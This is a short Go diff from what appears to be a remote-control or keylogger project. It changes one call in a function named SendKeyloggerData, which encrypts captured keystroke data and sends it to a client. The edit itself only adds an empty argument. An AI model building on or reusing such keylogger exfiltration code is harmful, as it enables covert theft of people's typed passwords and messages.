@@ -131,6 +131,6 @@ func SendKeyloggerData(clientId, keyloggerData string) common.HttpRetData {
 	sendUserId := common.ClientId
 	msg := "keyloggerData"
 	data, _ := crypto.Encrypt([]byte(keyloggerData), []byte(config.AesKey))
-	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
+	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data, "")
 	return retData
 }
